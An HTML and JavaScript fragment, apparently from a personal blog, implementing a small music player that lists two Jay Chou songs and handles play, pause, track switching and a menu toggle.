        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">爱在西元前 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">龙拳 - 周杰伦</span>
        </a>
      
    </div>
  </div>
</div>

<script>
  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
  let musics = $('.music-item')
  musics.eq(playIndex).addClass('active')
  var audio = document.getElementById("audio");

  $('.song-msg').html(musics[playIndex].dataset.name)
  audio.src = musics[playIndex].dataset.url


  var playbtn = document.getElementsByClassName("play-icon")[0];
  var playing = false;
  audio.loop = false;
  audio.addEventListener('ended', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  audio.addEventListener('play', function () {
    playbtn.classList.remove("icon-kaishi1")
    playbtn.classList.add("icon-kaishi")
    playing= true
  }, false);
  audio.addEventListener('pause', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  function toogleShowMusicList() {
    var musiclist = document.getElementsByClassName("music-list")[0];
    if(musiclist.className.indexOf("active") === -1){
      musiclist.classList.add("active")
    }else{
      musiclist.classList.remove("active");
    }
  }

  function playControl() {
    if(playing){
      audio.pause()
    }else{
      audio.play()
    }
  }

  function changePlayIndex(index) {
    if(playIndex !== index){
      localStorage.setItem('playIndex',index)
      playIndex = index
      musics.removeClass('active')
      musics.eq(playIndex).addClass('active')
      $('.song-msg').html(musics[playIndex].dataset.name)
      audio.src = musics[playIndex].dataset.url
      audio.play()
    }else{
      playControl()
    }
  }

  function preSong() {
    var index
    if(playIndex === 0){
      index = musics.length - 1
    }else{
      index = playIndex - 1
    }
    changePlayIndex(index)
  }

  function nextSong() {
    var index
    if(playIndex === musics.length - 1){
      index = 0
    }else{
      index = playIndex + 1
    }
    changePlayIndex(index)
  }
-->
  function toggleMenu() {
    var mainLeft = $('.main-left')
    if(mainLeft.hasClass('active')){
      mainLeft.removeClass('active')
      $('.menu').removeClass('icon-close')
      $('.menu').addClass('icon-menu')
    }else{
      mainLeft.addClass('active')
      $('.menu').removeClass('icon-menu')
      $('.menu').addClass('icon-close')
    }
  }
</script>
